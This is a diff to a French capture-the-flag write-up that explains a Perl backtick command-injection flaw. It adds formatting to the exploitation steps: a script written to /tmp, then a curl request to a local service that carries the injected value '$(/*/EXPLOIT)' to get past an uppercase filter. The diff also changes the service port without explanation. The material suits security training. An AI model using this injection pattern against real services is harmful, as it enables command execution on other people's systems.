@@ -13,9 +13,10 @@ Le backtick en Perl exécute une commande système → vulnérabilité de comman
 ### Exploitation
 On contourne la contrainte des majuscules en passant par un script externe.
 
+```bash
 $ echo 'getflag > /tmp/flag12' > /tmp/EXPLOIT
 $ chmod +x /tmp/EXPLOIT
 
-curl 'localhost:4747?x=$(/*/EXPLOIT)'
-cat /tmp/flag12
-
+$ curl 'localhost:4646?x=$(/*/EXPLOIT)'
+$ cat /tmp/flag12
+```
